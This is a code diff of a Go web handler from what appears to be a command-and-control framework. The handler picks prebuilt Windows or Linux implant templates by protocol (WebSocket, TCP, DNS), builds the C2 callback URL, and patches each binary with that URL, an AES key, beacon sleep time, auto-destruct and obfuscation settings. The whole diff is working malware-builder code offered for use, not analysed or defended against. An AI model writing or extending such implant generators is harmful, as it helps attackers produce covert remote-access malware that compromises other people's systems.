@@ -56,24 +56,44 @@ func HandleGenerate(c *gin.Context) {
 	
 	// Mode A: Binary Patch (Synchronous, fast)
 	if req.Method == "patch" {
+		// Prepare template name based on protocol and OS
 		templateName := "client_template_linux"
 		if req.OS == "windows" {
-			templateName = "client_template_windows.exe"
+			switch strings.ToUpper(ln.Protocol) {
+			case "WS":
+				templateName = "client_template_windows.exe"
+			case "TCP":
+				templateName = "client_template_windows_tcp.exe"
+			case "DNS":
+				templateName = "client_template_windows_dns.exe"
+			default:
+				templateName = "client_template_windows.exe"
+			}
 		}
 		
 		templatePath := filepath.Join("assets", templateName)
 		raw, err := os.ReadFile(templatePath)
 		if err != nil {
-			c.JSON(http.StatusInternalServerError, gin.H{"error": "未找到预编译模板，请先运行 generate_templates.sh 或切换到源码编译模式"})
+			c.JSON(http.StatusInternalServerError, gin.H{"error": "未找到预编译模板 (" + templateName + ")，请确保已编译模板或切换到源码模式"})
 			return
 		}
 
-		// Prepare C2 URL for patching
-		c2url := fmt.Sprintf("ws://%s:%d/ws", req.Host, ln.Port)
-		if strings.ToUpper(ln.Protocol) == "DNS" {
-			c2url = ln.NSDomain
-		} else if strings.ToUpper(ln.Protocol) == "TCP" {
-			c2url = fmt.Sprintf("%s:%d", req.Host, ln.Port)
+		// Prepare C2 URL with correct scheme
+		c2url := ""
+		host := req.Host
+		if host == "" {
+			host = "127.0.0.1"
+		}
+
+		switch strings.ToUpper(ln.Protocol) {
+		case "WS":
+			c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
+		case "TCP":
+			c2url = fmt.Sprintf("tcp://%s:%d", host, ln.Port)
+		case "DNS":
+			c2url = fmt.Sprintf("dns://%s", ln.NSDomain)
+		default:
+			c2url = fmt.Sprintf("ws://%s:%d/ws", host, ln.Port)
 		}
 
 		patched, err := services.PatchPayload(raw, c2url, req.AesKey, 10, "", req.AutoDestruct, req.SleepTime, req.EncryptionSalt, req.ObfuscationMode)
